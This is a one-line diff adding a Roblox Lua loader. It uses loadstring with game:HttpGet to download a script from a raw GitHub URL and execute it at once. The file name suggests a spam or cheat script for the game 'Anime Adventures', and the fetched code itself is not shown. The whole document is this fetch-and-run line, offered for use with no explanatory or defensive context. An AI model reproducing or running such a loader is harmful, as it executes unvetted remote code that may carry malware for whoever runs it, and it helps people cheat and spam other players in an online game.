@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/highwaymarevibrate/loaders/main/loaders/april-fool-s-anime-adventures-spam3-uzcscc74o4juuk.lua"))()
